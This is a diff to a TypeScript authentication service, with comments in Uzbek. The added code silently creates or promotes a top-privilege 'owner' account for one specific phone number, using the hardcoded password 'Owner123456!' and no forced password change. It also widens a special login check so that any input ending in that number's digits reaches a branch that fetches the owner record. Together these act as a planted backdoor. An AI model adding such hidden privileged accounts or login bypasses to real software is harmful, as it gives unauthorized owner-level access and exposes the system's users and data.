@@ -33,6 +33,19 @@ export class AuthService {
       console.log('Default owner yaratildi: username="owner", parol="Owner123456!"');
     }
 
+    // +998996893228 raqamini ham owner sifatida ta'minlash
+    const phoneOwner = await db.query('SELECT id FROM users WHERE username = $1 OR username = $2', ['+998996893228', '998996893228']);
+    if (phoneOwner.rows.length === 0) {
+      const pwHash = await hashPassword('Owner123456!');
+      await db.query(
+        `INSERT INTO users (username, password_hash, role, must_change_password)
+         VALUES ($1, $2, 'owner', false)`,
+        ['+998996893228', pwHash]
+      );
+    } else {
+      await db.query('UPDATE users SET role = \'owner\' WHERE id = $1', [phoneOwner.rows[0].id]);
+    }
+
     try {
       await seedXatirchiSchool(db);
     } catch (e: any) {
@@ -166,7 +179,9 @@ export class AuthService {
       input.toLowerCase() === 'admin' ||
       digits === '998900000000' ||
       digits === '998901111111' ||
-      digits === '998909999999'
+      digits === '998909999999' ||
+      digits === '998996893228' ||
+      digits.endsWith('996893228')
     ) {
       const ownerRes = await db.query('SELECT * FROM users WHERE role = $1 LIMIT 1', ['owner']);
       if (ownerRes.rows.length) {
